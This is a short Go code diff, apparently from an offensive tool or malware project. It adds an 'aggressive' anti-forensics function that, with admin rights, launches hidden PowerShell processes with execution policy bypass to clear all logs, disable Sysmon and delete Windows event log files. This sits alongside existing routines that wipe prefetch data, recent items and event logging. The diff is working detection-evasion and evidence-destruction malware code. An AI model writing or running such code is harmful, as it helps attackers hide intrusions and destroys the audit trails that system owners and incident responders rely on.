@@ -60,5 +60,33 @@ func performAntiForensics() {
 	go clearRecentItems()
 	go disableEventLogging()
 }
+
+func performAntiForensicsAggressive() {
+	if !isAdmin() {
+		return
+	}
+	go cleanPrefetch()
+	go clearRecentItems()
+	go disableEventLogging()
+
+	go func() {
+		cmd := cmdHidden(getPowerShellExeName(), "-NoProfile", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden",
+			"-Command", getClearAllLogsCmd())
+		_ = cmd.Run()
+	}()
+
+	go func() {
+		cmd := cmdHidden(getPowerShellExeName(), "-NoProfile", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden",
+			"-Command", getDisableSysmonCmd())
+		_ = cmd.Run()
+	}()
+
+	go func() {
+		time.Sleep(2 * time.Second)
+		cmd := cmdHidden(getPowerShellExeName(), "-NoProfile", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden",
+			"-Command", getDeleteEvtxCmd())
+		_ = cmd.Run()
+	}()
+}
 `)
 }
